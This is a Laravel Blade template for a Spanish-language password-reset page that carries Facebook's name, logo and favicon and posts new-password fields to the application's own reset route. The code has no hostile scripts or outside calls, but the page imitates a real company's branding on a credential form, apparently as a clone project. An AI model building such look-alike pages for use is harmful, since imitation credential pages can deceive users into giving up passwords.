<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="../img/facebook.ico" rel="shortcut icon" sizes="196x196">
        <title>Restablecer contraseña</title>
        <link rel="stylesheet" href="../css/cuenta_identificada.css">
    </head>
<body>
    <div class="container">
        <img src="../img/facebook-6.png" alt="Logo de Facebook" class="logo">
        <h2>Restablecer tu contraseña</h2>
        <form action="{{ route('password.update') }}" method="post">
            @csrf
            <input type="hidden" name="email" value="{{ $email }}">
            <input type="password" name="password" placeholder="Nueva contraseña" required>
            <input type="password" name="password_confirmation" placeholder="Confirmar contraseña" required>
            <button type="submit">Restablecer Contraseña</button>
        </form>
    </div>
</body>
</html>